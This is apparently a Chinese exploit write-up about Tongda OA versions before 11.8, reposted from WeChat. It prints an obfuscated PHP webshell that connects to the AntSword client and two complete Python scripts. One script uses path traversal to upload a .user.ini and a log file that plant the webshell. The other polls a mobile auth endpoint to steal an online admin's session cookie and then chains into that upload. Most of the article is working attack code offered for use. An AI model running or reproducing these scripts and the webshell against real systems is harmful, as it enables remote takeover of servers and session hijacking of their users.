---
source: "MrWQ/vulnerability-paper"
---

# (补充) 通达 OA v11-8 存储型 XSS 与 命令执行

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5TxJ_4rEPvMyjU3KVflkbQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**一****：漏洞描述🐑**

前一篇文章简单介绍了利用方法，但 v11.7 与 v11.8 Webshell 命令无法执行  

昨天收到了来自 Russell 师傅的建议，上传蚁剑可连接的 Webshell 控制服务器  

并可以配合之前的通达 OA v11.7 的任意在线用户 Cookie 泄露来进一步渗透

**二:  漏洞影响🐇**

**通达 0A V11.8 以下**

**三:  漏洞复现🐋**

**蚁剑的 webshell 为**

```
<?php 
echo "PeiQi_Wiki";
$fOgT=create_function(base64_decode('JA==').chr(114195/993).str_rot13('b').str_rot13('z').chr(708-607),chr(0xc60e/0x1f6).base64_decode('dg==').str_rot13('n').chr(390-282).chr(0x1ae-0x186).chr(0x3ac-0x388).chr(0xd561/0x1db).base64_decode('bw==').base64_decode('bQ==').base64_decode('ZQ==').str_rot13(')').chr(798-739));$fOgT(base64_decode('OTM2N'.'DM3O0'.'BldkF'.'sKCRf'.''.str_rot13('H').str_rot13('R').chr(41382/726).str_rot13('G').base64_decode('Vg==').''.''.base64_decode('Rg==').str_rot13('g').str_rot13('D').base64_decode('Wg==').chr(23751/273).''.'lRaV0'.'pOzI4'.'MDkzM'.'TE7'.''));?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXBQiaLY6vMhiaOC5NWayXOR9P0xqmgqUpVdgvOMuCUOiaKJnfpZUnic226Q/640?wx_fmt=png)

**上传 .user.ini 再上传 peiqi.log 后访问 URL 出现 PeiQi_Wiki 就是成功上传了**

```
http://192.168.1.103/general/reportshop/workshop/report/attachment-remark/form.inc.php?
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXhl9DMrFdbmu7Ib2naUic4fMuN6Xp5IZ7uxt1TibD28eicN88617viaAYyA/640?wx_fmt=png)

使用蚁剑连接 密码为 PeiQi (Url 访问无需登录，可直接远程连接)  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXC1IuSsBuLqPfyEtsVdicZsG8EP6XaibmWLBJ9oVJxWFgDYQ4vu7P0bEQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXKIWJukHdWibtW7jSibrUkP6mGhWahVjKTicBGTSrhiazg44aNBbqKExNJg/640?wx_fmt=png)

**这里重新写了一个 EXP，为蚁剑 Webshell 上传 EXP（文末获取）**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXiae4RiaeNGdP3X7PjVfjFXibs1QF103Y131c76J9PxmEnGqz1vn7SyPvQ/640?wx_fmt=png)

**配合 之前的通达 OA v11.7 以下的在线用户 Cookie 泄露**

**一旦用户登录 OA 系统时就主动上传 Webshell**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXarSzexOYwe2nZ7lZUBC8IZibhHlsUYXfDcIwJL9cnQs6jpjfXxC75bg/640?wx_fmt=png)

****四:  漏洞 POC🦉****

```
https://github.com/PeiQi0/PeiQi-WIKI-POC
目前POC已经全部上传到Github
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXH5Dc2zLKmekCoib4e1nNDiczwo1pfqicy7tdxfkCsJM9kmPQgTF6tP41Q/640?wx_fmt=png)

**蚁剑后台文件上传  
**

```
import requests
import sys
import random
import re
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 通达OA < V11.8                                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mCookie      >>> xxxxxxxxxxxxxxxxxxxxxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, Cookie):
    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/.user"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie": Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \033[0m".format(target_url))
        if "档案已保存" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 成功上传.user.ini文件, \033[0m".format(target_url))
            POC_2(target_url, Cookie)
        else:
            print("\033[31m[x] 目标 {} 上传.user.ini文件失败\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, Cookie):
    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/peiqi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie":  Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwIAplY2hvICJQZWlRaV9XaWtpIjsKJGZPZ1Q9Y3JlYXRlX2Z1bmN0aW9uKGJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoMTE0MTk1Lzk5Mykuc3RyX3JvdDEzKCdiJykuc3RyX3JvdDEzKCd6JykuY2hyKDcwOC02MDcpLGNocigweGM2MGUvMHgxZjYpLmJhc2U2NF9kZWNvZGUoJ2RnPT0nKS5zdHJfcm90MTMoJ24nKS5jaHIoMzkwLTI4MikuY2hyKDB4MWFlLTB4MTg2KS5jaHIoMHgzYWMtMHgzODgpLmNocigweGQ1NjEvMHgxZGIpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5iYXNlNjRfZGVjb2RlKCdiUT09JykuYmFzZTY0X2RlY29kZSgnWlE9PScpLnN0cl9yb3QxMygnKScpLmNocig3OTgtNzM5KSk7JGZPZ1QoYmFzZTY0X2RlY29kZSgnT1RNMk4nLidETTNPMCcuJ0JsZGtGJy4nc0tDUmYnLicnLnN0cl9yb3QxMygnSCcpLnN0cl9yb3QxMygnUicpLmNocig0MTM4Mi83MjYpLnN0cl9yb3QxMygnRycpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5iYXNlNjRfZGVjb2RlKCdSZz09Jykuc3RyX3JvdDEzKCdnJykuc3RyX3JvdDEzKCdEJykuYmFzZTY0X2RlY29kZSgnV2c9PScpLmNocigyMzc1MS8yNzMpLicnLidsUmFWMCcuJ3BPekk0Jy4nTURrek0nLidURTcnLicnKSk7Pz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0K")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \033[0m".format(target_url))
        if "档案已保存" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \033[0m".format(target_url))
            POC_3(target_url, Cookie)
        else:
            print("\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, Cookie):
    vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie":  Cookie,
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \033[0m".format(target_url))
        if "PeiQi_Wiki" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki \033[0m".format(target_url))
            print("\033[32m[o] 成功上传蚁剑木马 密码为: PeiQi \n[o] webshell路径: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\033[0m".format(target_url))

        else:
            print("\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\033[0m".format(target_url))
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    Cookie = "PHPSESSID=ug4ip8ohugo61bmu399npplep5; USER_NAME_COOKIE=admin; OA_USER_ID=admin"
    POC_1(target_url, Cookie)
```

**登录 Cookie 泄露配合后台文件上传  
**

```
import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 通达OA 11.7                                               \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_0(target_url):
    vuln_url = target_url + "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "RELOGIN" in response.text and response.status_code == 200:
            print("\033[31m[x] 目标用户为下线状态 --- {}\033[0m".format(time.asctime( time.localtime(time.time()))))
        elif response.status_code == 200 and response.text == "":
            Cookie = re.findall(r'PHPSESSID=(.*?);', str(response.headers))
            print("\033[32m[o] 用户上线 PHPSESSION: {} --- {}\033[0m".format(Cookie[0] ,time.asctime(time.localtime(time.time()))))
            Cookie = "PHPSESSID={};USER_NAME_COOKIE=admin; OA_USER_ID=admin".format(Cookie[0])
            POC_1(target_url, Cookie)
        else:
            print("\033[31m[x] 请求失败，目标可能不存在漏洞")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_1(target_url, Cookie):
    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/.user"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie": Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \033[0m".format(target_url))
        if "档案已保存" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 成功上传.user.ini文件, \033[0m".format(target_url))
            POC_2(target_url, Cookie)
        else:
            print("\033[31m[x] 目标 {} 上传.user.ini文件失败\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, Cookie):
    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/peiqi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie":  Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwIAplY2hvICJQZWlRaV9XaWtpIjsKJGZPZ1Q9Y3JlYXRlX2Z1bmN0aW9uKGJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoMTE0MTk1Lzk5Mykuc3RyX3JvdDEzKCdiJykuc3RyX3JvdDEzKCd6JykuY2hyKDcwOC02MDcpLGNocigweGM2MGUvMHgxZjYpLmJhc2U2NF9kZWNvZGUoJ2RnPT0nKS5zdHJfcm90MTMoJ24nKS5jaHIoMzkwLTI4MikuY2hyKDB4MWFlLTB4MTg2KS5jaHIoMHgzYWMtMHgzODgpLmNocigweGQ1NjEvMHgxZGIpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5iYXNlNjRfZGVjb2RlKCdiUT09JykuYmFzZTY0X2RlY29kZSgnWlE9PScpLnN0cl9yb3QxMygnKScpLmNocig3OTgtNzM5KSk7JGZPZ1QoYmFzZTY0X2RlY29kZSgnT1RNMk4nLidETTNPMCcuJ0JsZGtGJy4nc0tDUmYnLicnLnN0cl9yb3QxMygnSCcpLnN0cl9yb3QxMygnUicpLmNocig0MTM4Mi83MjYpLnN0cl9yb3QxMygnRycpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5iYXNlNjRfZGVjb2RlKCdSZz09Jykuc3RyX3JvdDEzKCdnJykuc3RyX3JvdDEzKCdEJykuYmFzZTY0X2RlY29kZSgnV2c9PScpLmNocigyMzc1MS8yNzMpLicnLidsUmFWMCcuJ3BPekk0Jy4nTURrek0nLidURTcnLicnKSk7Pz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0K")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \033[0m".format(target_url))
        if "档案已保存" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \033[0m".format(target_url))
            POC_3(target_url, Cookie)
        else:
            print("\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, Cookie):
    vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie":  Cookie,
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \033[0m".format(target_url))
        if "PeiQi_Wiki" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki \033[0m".format(target_url))
            print("\033[32m[o] 成功上传蚁剑木马 密码为: PeiQi \n[o] webshell路径: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\033[0m".format(target_url))
            sys.exit(0)
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\033[0m".format(target_url))
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    while True:
        POC_0(target_url)
        time.sleep(5)
```

最后
--

> 下面就是文库和团队的公众号啦，更新的文章都会在第一时间推送在公众号
> 
> 别忘了 Github 下载完给个小星星⭐

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro75IHato7k7WJakCwObVtic8kOiagRSTylHIhHxg4DVKOhBFDazKkCMgvw/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
